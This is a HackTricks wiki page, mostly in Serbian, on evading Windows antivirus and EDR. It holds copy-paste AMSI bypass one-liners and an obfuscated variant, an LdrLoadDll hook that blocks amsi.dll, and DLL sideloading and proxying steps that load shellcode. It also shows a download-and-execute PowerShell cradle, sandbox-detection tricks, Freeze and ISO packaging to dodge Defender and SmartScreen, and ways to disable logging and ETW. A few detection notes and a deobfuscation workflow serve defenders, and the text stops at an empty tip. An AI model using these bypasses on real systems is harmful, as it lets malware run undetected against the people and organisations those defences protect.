# Zaobilaženje Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Stranicu je napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Isključi Defender

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat koji zaustavlja Windows Defender lažirajući drugi AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Metodologija izbegavanja AV-a**

Trenutno, AVs koriste različite metode za proveru da li je fajl maliciozan ili ne: static detection, dynamic analysis, i za naprednije EDRs, behavioural analysis.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih malicioznih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i izvlačenjem informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može dovesti do toga da budete lakše otkriveni, pošto su verovatno već analizirani i označeni kao maliciozni. Postoji nekoliko načina da se izbegne ovakva detekcija:

- **Encryption**

Ako enkriptuješ binarni fajl, AV neće moći da detektuje tvoj program, ali biće ti potreban loader koji dekriptuje i pokrene program u memoriji.

- **Obfuscation**

Ponekad je dovoljno promeniti neke stringove u binarnom fajlu ili skripti da bi se prošlo pored AV-a, ali to može biti vremenski zahtevno u zavisnosti od toga šta pokušavaš da obfuskuješ.

- **Custom tooling**

Ako razviješ sopstvene alate, neće postojati poznati loši potpisi, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način za proveru protiv Windows Defender statičke detekcije je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). U suštini deli fajl na više segmenata i potom traži od Defender-a da skenira svaki pojedinačno — na taj način može tačno da ti kaže koji su stringovi ili bajtovi označeni u tvom binarnom fajlu.

Toplo preporučujem da pogledaš ovu YouTube playlistu o praktičnom AV Evasion.

### **Dinamička analiza**

Dinamička analiza je kada AV pokreće tvoj binarni fajl u sandboxu i posmatra malicioznu aktivnost (npr. pokušaj dekriptovanja i čitanja lozinki iz browser-a, pravljenje minidump-a LSASS-a, itd.). Ovaj deo može biti malo komplikovaniji za zaobilaženje, ali evo nekoliko stvari koje možeš da uradiš da izbegneš sandbokse.

- **Sleep before execution** U zavisnosti od implementacije, može biti odličan način za zaobilaženje AV-ove dinamičke analize. AV's imaju vrlo malo vremena da skeniraju fajlove kako ne bi remetili rad korisnika, pa korišćenje dugih pauza može poremetiti analizu binarnih fajlova. Problem je što mnogi AV-ovi u sandboxu mogu jednostavno preskočiti sleep u zavisnosti od implementacije.
- **Checking machine's resources** Obično sandboksevi imaju vrlo malo resursa za rad (npr. < 2GB RAM), inače bi mogli usporiti mašinu korisnika. Ovde možeš biti veoma kreativan, na primer proverom temperature CPU-a ili čak brzine ventilatora — nije sve obavezno implementirano u sandboxu.
- **Machine-specific checks** Ako želiš da ciljaš korisnika čija je radna stanica pridružena domenu "contoso.local", možeš proveriti domen računara da vidiš da li se poklapa sa onim koji si naveo; ako se ne poklapa, možeš natjerati program da izađe.

Ispostavilo se da je ime računara u Microsoft Defender sandbox-u HAL9TH, tako da možeš proveriti ime računara u svom malveru pre detonacije — ako se ime poklapa sa HAL9TH, znači da si unutar Defender-ovog sandboka i možeš naterati program da izađe.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko odličnih saveta od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **public tools** će na kraju **biti detektovani**, pa treba da se zapitaš nešto:

Na primer, ako želiš da dump-uješ LSASS, **da li zaista treba da koristiš mimikatz**? Ili bi mogao da upotrebiš neki drugi projekat koji je manje poznat, a koji takođe dump-uje LSASS.

Pravi odgovor je verovatno ovo drugo. Uzevši mimikatz kao primer, verovatno je jedan od, ako ne i najčešće označenih komada malvera od strane AV-a i EDR-a — iako je projekat super kul, takođe je noćna mora pokušavati ga prilagoditi da zaobiđe AV, pa jednostavno potraži alternative za ono što želiš da postigneš.

> [!TIP]
> Prilikom modifikovanja payload-ova radi evazije, obavezno isključi automatsko slanje uzoraka (automatic sample submission) u defender-u, i, molim te, ozbiljno, **NE UPLAĐUJ NA VIRUSTOTAL** ako ti je cilj dugoročna evazija. Ako želiš da proveriš da li tvoj payload biva detektovan od strane određenog AV-a, instaliraj ga na VM, pokušaj isključiti automatic sample submission i testiraj tamo dok ne budeš zadovoljan rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **prioritizuj korišćenje DLLs za evaziju**, po mom iskustvu, DLL fajlovi su obično **mnogo manje detektovani** i analizirani, pa je to vrlo jednostavan trik za izbegavanje detekcije u nekim slučajevima (ako tvoj payload naravno ima način da se izvrši kao DLL).

Kao što vidimo na slici, DLL Payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me uporedni prikaz normalnog Havoc EXE payload-a naspram normalnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možeš koristiti sa DLL fajlovima da budeš mnogo prikriveniji.

## DLL Sideloading & Proxying

**DLL Sideloading** iskorišćava DLL search order koji koristi loader tako što pozicionira i pogođenu aplikaciju i maliciozne payload-ove jedno pored drugog.

Možeš proveriti programe podložne DLL Sideloading koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijackingu unutar "C:\Program Files\\" i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **istražite DLL Hijackable/Sideloadable programs sami**, ova tehnika je prilično neprimetna ako se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti otkriveni.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita neće pokrenuti vaš payload, jer program očekuje neke specifične funkcije u tom DLL-u. Da bismo to rešili, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi iz proxy (i malicioznog) DLL-a ka originalnom DLL-u, čime se čuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati dva fajla: šablon izvornog koda DLL i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Kako naše shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading i takođe [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste detaljnije naučili ono o čemu smo govorili.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules mogu exportovati funkcije koje su zapravo "forwarders": umesto da pokazuju na kod, export entry sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada caller reši taj export, Windows loader će:

- Učita `TargetDll` ako već nije učitan
- Rešava `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, on se dobavlja iz zaštićenog KnownDLLs namespace-a (npr. ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se normalan DLL search order, koji uključuje direktorijum modula koji vrši forward resolution.

Ovo omogućava indirektnu sideloading primitive: pronađite potpisani DLL koji exportuje funkciju prosleđenu na ime modula koji nije KnownDLL, zatim smestite taj potpisani DLL zajedno sa attacker-controlled DLL-om koji se tačno zove kao prosleđeni cilj modula. Kada se prosleđeni export pozove, loader razrešava forward i učitava vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Primer primećen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, tako da se rešava normalnim redosledom pretrage.

PoC (copy-paste):
1) Kopiraj potpisanu sistemsku DLL u direktorijum u koji se može pisati
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite maliciozni `NCRYPTPROV.dll` u isti direktorijum. Minimalan DllMain je dovoljan za izvođenje koda; nije potrebno implementirati prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite forward pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Primećeno ponašanje:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader sledi forward do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što je `DllMain` već izvršen

Saveti za otkrivanje:
- Fokusirajte se na forwarded exports gde ciljni modul nije KnownDLL. KnownDLLs su navedeni u `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete da izlistate forwarded exports pomoću alata kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwardera da biste pretražili kandidate: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- Enforce code integrity policies (WDAC/AppLocker) and deny write+execute in application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite vaš shellcode na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša — ono što danas radi može sutra biti detektovano, zato se nikada ne oslanjajte samo na jedan alat; ako je moguće, pokušajte lančati više evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

It allows antivirus solutions to inspect script behavior by exposing script contents in a form that is both unencrypted and unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

Nismo ostavili nijedan fajl na disk, ali smo ipak uhvaćeni in-memory zbog AMSI.

Štaviše, počevši od **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi pomoću statičkih detekcija, izmena skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima mogućnost da deobfuskuje skripte čak i ako su obfuskovane u više slojeva, tako da obfuscation može biti loša opcija u zavisnosti od načina na koji je urađeno. To čini izbegavanje manje trivijalnim. Ipak, ponekad je dovoljno promeniti par imena promenljivih i bićete u redu, pa sve zavisi koliko je nešto označeno.

- **AMSI Bypass**

Pošto se AMSI implementira tako što učitava DLL u proces powershell (takođe cscript.exe, wscript.exe, itd.), moguće je lako ga menjati čak i kada se radi kao neprivilegovan korisnik. Zbog ovog propusta u implementaciji AMSI, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Forsiranje greške**

Forsiranje da AMSI inicijalizacija ne uspe (amsiInitFailed) će rezultovati time da se za trenutni proces neće pokrenuti nikakvo skeniranje. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio signature da bi sprečio širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Za onemogućavanje AMSI-ja za trenutni powershell proces bila je dovoljna samo jedna linija powershell koda. Ta linija je, naravno, detektovana od strane samog AMSI-ja, pa je potrebna modifikacija da bi se ova tehnika mogla koristiti.

Evo modifikovanog AMSI bypassa koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti označeno kada ova objava izađe, pa ne biste trebali objavljivati bilo kakav kod ako planirate ostati neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (koja je odgovorna za skeniranje unosa koji dostavi korisnik) i prepisivanje iste instrukcijama koje vraćaju kod E_INVALIDARG; na taj način, rezultat stvarnog skeniranja će vratiti 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike koje se koriste za zaobilaženje AMSI-ja pomoću powershell, pogledajte [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što je `amsi.dll` učitan u trenutni proces. Robusno, jezički-neovisno zaobilaženje je postavljanje user‑mode hook-a na `ntdll!LdrLoadDll` koji vraća grešku kada je tražani modul `amsi.dll`. Kao rezultat, AMSI se nikada ne učitava i za taj proces se ne vrše skeniranja.

Nacrt implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Napomene
- Radi u PowerShell, WScript/CScript i prilagođenim loader-ima (bilo šta što bi inače učitalo AMSI).
- Upotrebite zajedno sa slanjem skripti preko stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli dugačke artefakte komandne linije.
- Primećeno da se koristi u loader-ima pokrenutim preko LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

Ovaj alat [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) takođe generiše skriptu za zaobilaženje AMSI.

**Uklonite detektovani potpis**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite detektovani AMSI potpis iz memorije tekućeg procesa. Ovaj alat radi tako što skenira memoriju tekućeg procesa u potrazi za AMSI potpisom, a zatim ga prepisuje NOP instrukcijama, efikasno uklanjajući ga iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete naći u **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI neće biti učitan, tako da možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete ovo uraditi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja vam omogućava da beležite sve PowerShell komande izvršene na sistemu. Ovo može biti korisno za reviziju i rešavanje problema, ali takođe može predstavljati **problem za napadače koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) u tu svrhu.
- **Use Powershell version 2**: Ako koristite PowerShell verziju 2, AMSI neće biti učitan, pa možete pokretati skripte bez skeniranja od strane AMSI. Ovo možete uraditi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da pokrenete powershell bez zaštita (ovo je ono što `powerpick` iz Cobal Strike koristi).


## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuskacije se oslanja na enkriptovanje podataka, što će povećati entropiju binarnog fajla i olakšati AV-ima i EDR-ima da ga detektuju. Budite oprezni sa tim i možda primenite enkripciju samo na određene sekcije koda koje su osetljive ili koje treba da budu sakrivene.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malvera koji koristi ConfuserEx 2 (ili komercijalne fork-ove) često se susrećete sa nekoliko slojeva zaštite koji onemogućavaju dekompilere i sandbokse. Radni tok ispod pouzdano **obnavlja skoro-originalni IL** koji potom može biti dekompajliran u C# u alatima kao što su dnSpy ili ILSpy.

1.  Anti-tampering removal – ConfuserEx enkriptuje svako *method body* i dekriptuje ga unutar *module* statičkog konstruktora (`<Module>.cctor`). Ovo takođe zakrpi PE checksum pa bilo koja izmena može prouzrokovati pad izvršavanja binarnog fajla. Koristite **AntiTamperKiller** da locirate enkriptovane metadata tabele, povratite XOR ključeve i prepišete čist assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izgradnji sopstvenog unpacker-a.

2.  Symbol / control-flow recovery – ubacite *clean* fajl u **de4dot-cex** (ConfuserEx-aware fork de4dot-a).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Opcije:
• `-p crx` – odabir ConfuserEx 2 profila  
• de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i imena promenljivih i dekriptovati konstantne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda sa laganim wrapper-ima (tzv. *proxy calls*) da bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebali biste uočiti uobičajene .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()` umesto nejasnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Manual clean-up – pokrenite dobijeni binarni fajl u dnSpy-u, pretražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da locirate *pravi* payload. Često malver skladišti payload kao TLV-kodirani niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Gore opisani lanac obnavlja tok izvršenja **bez** potrebe da se uzorak pokreće – korisno pri radu na offline radnoj stanici.

> 🛈  ConfuserEx proizvodi custom atribut nazvan `ConfusedByAttribute` koji može biti korišćen kao IOC za automatsku trižu uzoraka.

#### Jednolinijski primer
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompajlacionog skupa koji omogućava povećanu bezbednost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštitu od manipulacije.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik da bi se, u vreme kompajliranja, generisao obfuskovani kod bez upotrebe eksternog alata i bez izmena kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih pomoću C++ template metaprogramming framework-a koji će malo otežati život osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuskuje različite PE fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za jezike podržane od strane LLVM koji koristi ROP (return-oriented programming). ROPfuscator obfuskuje program na nivou assembly koda transformišući regularne instrukcije u ROP lance, potkopavajući naše prirodno poimanje normalnog toka kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL u shellcode i zatim ih učita

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na osnovu reputacije, što znači da aplikacije koje se retko preuzimaju pokreću SmartScreen, upozoravajući i sprečavajući krajnjeg korisnika da izvrši fajl (iako fajl i dalje može biti pokrenut klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani sa **pouzdanim** sertifikatom za potpisivanje **neće pokrenuti SmartScreen**.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web jeste pakovanje u neku vrstu kontejnera kao što je ISO. Ovo se dešava zato što Mark-of-the-Web (MOTW) **ne može** biti primenjen na **non NTFS** volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloads u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji omogućava aplikacijama i komponentama sistema da **log events**. Međutim, on se takođe može koristiti od strane security proizvoda za nadzor i detekciju malicioznih aktivnosti.

Slično načinu na koji je AMSI onemogućen (bypassed), moguće je i učiniti da funkcija **`EtwEventWrite`** u userspace procesu odmah vraća kontrolu bez logovanja bilo kakvih događaja. To se postiže patchovanjem funkcije u memoriji da odmah vrati, efektivno onemogućavajući ETW logovanje za taj proces.

Više informacija možete naći u **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory je poznat već duže vreme i i dalje je odličan način za pokretanje post-exploitation alata bez otkrivanja od strane AV.

Pošto će payload biti učitan direktno u memoriju bez dodirivanja diska, moraćemo samo da se pozabavimo patchovanjem AMSI za ceo proces.

Većina C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućava izvršavanje C# assemblies direktno u memoriji, ali postoje različiti načini da se to uradi:

- **Fork\&Run**

To podrazumeva **pokretanje novog "sacrificial" procesa**, injektovanje vašeg post-exploitation malicioznog koda u taj novi proces, izvršavanje tog koda i, kada se završi, ubijanje novog procesa. Ovo ima i prednosti i mane. Prednost fork and run metode je što se izvršenje dešava **izvan** našeg Beacon implant procesa. To znači da, ako nešto u našoj post-exploitation akciji krene po zlu ili bude otkriveno, postoji **mnogo veća šansa** da naš **implant preživi.** Mana je što imate **veću šansu** da budete uhvaćeni od strane **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju post-exploitation malicioznog koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali mana je što, ako nešto krene po zlu sa izvršenjem vašeg payload-a, postoji **mnogo veća šansa** da **izgubite svoj beacon** jer bi mogao da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
